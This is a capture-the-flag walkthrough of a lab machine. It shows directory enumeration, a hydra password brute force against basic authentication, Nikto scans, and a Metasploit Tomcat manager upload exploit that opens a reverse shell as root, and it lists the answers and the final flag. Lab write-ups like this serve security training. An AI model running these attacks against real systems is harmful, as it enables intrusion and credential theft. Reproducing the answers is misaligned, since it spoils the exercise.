```BASH
gobuster dir -u "http://10.10.148.25/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
```
![image](https://github.com/user-attachments/assets/23f686c9-345a-47e5-83e2-01a4b5b4d991)
What directory can you find, that begins with a "g"?
<pre>/guidelines</pre>  

<span style="line-height:0.5;">&nbsp;</span>

Whose name can you find from this directory?  
![image](https://github.com/user-attachments/assets/a1c7ea0b-435f-4b45-90e3-9589637fd0f6)
<pre>bob</pre>

<span style="line-height:0.5;">&nbsp;</span>

What directory has basic authentication?
![image](https://github.com/user-attachments/assets/6864c34a-dcca-4f8a-95e4-15dd57a6fd76)
<pre>protected</pre>

<span style="line-height:0.5;">&nbsp;</span>

What is bob's password to the protected part of the website?
```BASH
sudo hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.148.25 http-get /protected
```
![image](https://github.com/user-attachments/assets/d00e7c3b-52a3-4fde-a52e-5034939784af)
<pre>bubbles</pre>

<span style="line-height:0.5;">&nbsp;</span>

What other port that serves a webs service is open on the machine?
```BASH
nmap 10.10.148.25
```
![image](https://github.com/user-attachments/assets/b14ccc4d-b4dc-4c5c-9d1d-fa0e4214e8d9)
<pre>1234</pre>

<span style="line-height:0.5;">&nbsp;</span>

What is the name and version of the software running on the port from question 5?
![image](https://github.com/user-attachments/assets/4725bf64-5644-4d03-bf20-dd25d243aee4)
<pre>Apache Tomcat/7.0.88</pre>

<span style="line-height:0.5;">&nbsp;</span>

Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.
```BASH
nikto -h http://10.10.148.25:1234/manager/html -id bob:bubbles
```
![image](https://github.com/user-attachments/assets/c52c2ca9-debf-48b2-97c7-247a09b11e88)
<pre>5</pre>

<span style="line-height:0.5;">&nbsp;</span>

What version of Apache-Coyote is this service using?
<pre>1.1</pre>

<span style="line-height:0.5;">&nbsp;</span>

What is the server version?
```BASH
nikto -h http://10.10.148.25:80 -id bob:bubbles
```
![image](https://github.com/user-attachments/assets/b3813caf-2e5d-4c14-aa28-4a2572d6244a)
<pre>Apache/2.4.18</pre>

<span style="line-height:0.5;">&nbsp;</span>

[Metasploit](https://www.metasploit.com/) can be used to exploit Tomcat Manager vulnerabilities using the tomcat_mgr_upload exploit module.

Run Metasploit:
```BASH
msfconsole
```

Use exploit module:
```BASH
use exploit/multi/http/tomcat_mgr_upload
```

Set required options:
```BASH
set RHOSTS 10.10.148.25
set LHOST 10.10.168.110
set RPORT 1234
set LPORT 4444
set HttpPassword bubbles
set HttpUsername bob
```

Use run command
```BASH
run
```
![image](https://github.com/user-attachments/assets/6a2e44af-f51c-428b-92f1-0102727b9083)

What user did you get a shell as?
![image](https://github.com/user-attachments/assets/acef8c06-b490-4770-a858-57f3e6d61995)
<pre>root</pre>

What flag is found in the root directory?
![image](https://github.com/user-attachments/assets/07afa7ce-89c5-4e39-9836-a0c178651576)
<pre>ff1fc4a81affcc7688cf89ae7dc6e0e1</pre>


